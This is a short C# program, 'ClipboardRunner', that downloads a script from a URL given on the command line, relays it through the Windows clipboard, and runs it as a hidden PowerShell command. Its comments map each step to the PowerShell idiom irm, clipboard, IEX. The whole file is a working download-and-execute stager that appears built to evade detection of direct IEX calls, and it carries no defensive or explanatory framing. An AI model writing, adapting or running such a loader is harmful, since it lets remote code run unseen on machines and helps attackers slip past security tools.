using System;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Diagnostics;

class ClipboardRunner
{
    [STAThread]
    static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: ClipboardRunner.exe <url> [-d]");
            Console.WriteLine("  -d  Download only (no execute)");
            return;
        }

        string url = args[0];
        bool downloadOnly = args.Length > 1 && args[1] == "-d";

        // irm <url>
        using (WebClient client = new WebClient())
        {
            string content = client.DownloadString(url);

            // [Windows.Clipboard]::SetText(...)
            Clipboard.SetText(content);
        }

        if (downloadOnly)
            return;

        // sleep 2
        Thread.Sleep(2000);

        // IEX ([Windows.Clipboard]::GetText())
        string script = Clipboard.GetText();
        
        Process.Start(new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = "-Command \"" + script.Replace("\"", "\\\"") + "\"",
            UseShellExecute = false,
            CreateNoWindow = true
        });
    }
}

